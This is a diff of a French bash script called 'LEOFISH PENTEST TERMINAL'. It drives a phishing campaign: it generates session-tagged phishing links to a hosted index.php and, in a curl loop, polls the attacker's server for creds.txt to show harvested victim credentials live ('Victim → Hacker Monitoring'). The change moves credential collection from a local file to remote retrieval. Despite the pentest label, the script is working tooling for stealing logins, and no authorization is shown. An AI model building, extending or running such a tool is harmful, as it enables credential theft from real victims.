@@ -1,5 +1,4 @@
 #!/bin/bash
-
 # ══════════════════════════════════════════
 #         LEOFISH PENTEST TERMINAL
 # ══════════════════════════════════════════
@@ -17,10 +16,9 @@ NC='\033[0m'
 # Fichiers
 CREDIT_FILE="credit.text"
 HELP_FILE="help.text"
-LOGS_FILE="creds.txt"
 
-# URL de ton app Render (modifie ici)
-APP_URL="https://leofish-tool-v1-0.onrender.com/index.php"
+# URL Render — base sans index.php
+APP_URL="https://leofish-tool-v1-0.onrender.com"
 
 # Créer dossier sessions
 mkdir -p sessions
@@ -36,8 +34,8 @@ show_banner() {
     fi
     echo -e "${NC}"
     echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.0                    ${WHITE}║${NC}"
-    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring                        ${WHITE}║${NC}"
+    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.0                         ${WHITE}║${NC}"
+    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring                    ${WHITE}║${NC}"
     echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
 }
@@ -47,12 +45,12 @@ show_banner() {
 # ══════════════════════════════════════════
 generate_campaign() {
     show_banner
-    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE DE PHISH ${NC}"
+    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE DE PHISH${NC}"
     echo ""
 
-    # Lancer le serveur Render (ping pour le réveiller)
+    # Ping Render pour le réveiller
     echo -e "${YELLOW}⚡ Connexion au serveur Render...${NC}"
-    curl -s --max-time 10 "$APP_URL" > /dev/null 2>&1
+    curl -s --max-time 15 "$APP_URL" > /dev/null 2>&1
     if [ $? -eq 0 ]; then
         echo -e "${GREEN}✅ Serveur en ligne${NC}"
     else
@@ -63,10 +61,10 @@ generate_campaign() {
     # ID unique de session
     SESSION_ID=$(date +%s)_$(openssl rand -hex 8 2>/dev/null || echo $RANDOM$RANDOM)
 
-    # Lien vers index.php avec l'ID session
+    # Lien vers index.php
     PHISH_LINK="${APP_URL}/index.php?session=${SESSION_ID}"
 
-    # Log fichier de cette session
+    # Log local de cette session
     SESSION_LOG="sessions/${SESSION_ID}.log"
     echo "=== SESSION PENTEST $(date) ===" > "$SESSION_LOG"
     echo "Lien: $PHISH_LINK" >> "$SESSION_LOG"
@@ -82,50 +80,47 @@ generate_campaign() {
     echo ""
     read -rp "$(echo -e "${WHITE}Appuie sur Entrée pour démarrer le monitoring...${NC}")"
 
-    # Lancer le monitoring
     monitor_logs "$SESSION_ID" "$SESSION_LOG"
 }
 
 # ══════════════════════════════════════════
-# MONITORING LOGS TEMPS RÉEL (lit logs.txt)
+# MONITORING — FETCH creds.txt DEPUIS RENDER
 # ══════════════════════════════════════════
 monitor_logs() {
     local session_id=$1
     local session_log=$2
-    local last_line=0
+    local last_content=""
 
     show_banner
     echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC}"
     echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
-    echo -e "${BLUE}📄 Lecture des logs depuis : ${WHITE}${LOGS_FILE}${NC}"
+    echo -e "${BLUE}📡 Lecture des logs depuis : ${WHITE}${APP_URL}/creds.txt${NC}"
     echo ""
 
-    # Créer logs.txt s'il n'existe pas
-    touch "$LOGS_FILE"
-
     while true; do
-        # Lire les nouvelles lignes du fichier logs.txt
-        current_lines=$(wc -l < "$LOGS_FILE")
+        # Fetch creds.txt depuis le serveur Render
+        current=$(curl -s --max-time 10 "${APP_URL}/creds.txt")
 
-        if [ "$current_lines" -gt "$last_line" ]; then
-            # Afficher uniquement les nouvelles lignes
-            new_data=$(tail -n +"$((last_line + 1))" "$LOGS_FILE")
+        if [ -n "$current" ] && [ "$current" != "$last_content" ]; then
+            clear
+            show_banner
+            echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC}"
+            echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
+            echo ""
 
             while IFS= read -r line; do
                 if [ -n "$line" ]; then
-                    timestamp=$(date '+%H:%M:%S')
-                    echo -e "${GREEN}[${timestamp}]${YELLOW} $line${NC}"
-                    echo "${timestamp} - $line" >> "$session_log"
+                    echo -e "${GREEN}[$(date '+%H:%M:%S')]${YELLOW} $line${NC}"
+                    echo "$(date '+%H:%M:%S') - $line" >> "$session_log"
                 fi
-            done <<< "$new_data"
+            done <<< "$current"
 
-            last_line=$current_lines
+            last_content="$current"
         else
-            # Aucune activité → afficher un dot toutes les 5s
             echo -ne "${BLUE}.${NC}"
         fi
 
-        sleep 2
+        sleep 3
     done
 }
 
@@ -181,7 +176,6 @@ show_help() {
 main_menu() {
     while true; do
         show_banner
-
         echo -e "  ${GREEN}1${NC}  ${CYAN}🎣${NC}  ${YELLOW}Nouvelle campagne${NC}  ${WHITE}(générer lien + monitoring)${NC}"
         echo -e "  ${GREEN}2${NC}  ${CYAN}📂${NC}  ${YELLOW}Sessions enregistrées${NC}"
         echo -e "  ${GREEN}3${NC}  ${CYAN}📖${NC}  ${YELLOW}Aide${NC}"
@@ -209,12 +203,6 @@ fi
 
 if [ ! -f "$HELP_FILE" ]; then
     echo -e "${YELLOW}⚠️  help.text manquant — crée le fichier pour afficher l'aide.${NC}"
-fi
-
-if [ ! -f "$LOGS_FILE" ]; then
-    touch "$LOGS_FILE"
-    echo -e "${BLUE}ℹ️  logs.txt créé — terminal.php doit écrire dedans.${NC}"
-    sleep 1
 fi
 
 main_menu
